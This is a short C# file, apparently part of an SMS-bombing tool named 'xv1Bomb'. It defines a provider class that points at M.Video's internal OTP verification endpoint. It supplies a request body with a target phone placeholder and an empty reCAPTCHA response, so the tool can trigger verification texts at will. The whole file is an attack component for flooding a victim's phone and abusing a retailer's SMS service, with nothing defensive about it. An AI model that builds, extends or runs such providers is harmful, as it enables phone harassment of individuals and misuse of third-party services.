namespace xv1Bomb.providers
{
    public class mvideoProvider : smsProvider
    {
        public string link { get; set; } = @"https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp";
        public string json { get; set; } = @"{""phone"":""+7@"", ""recaptcha"":""on"", ""g-recaptcha-response"":""""}";
    }
}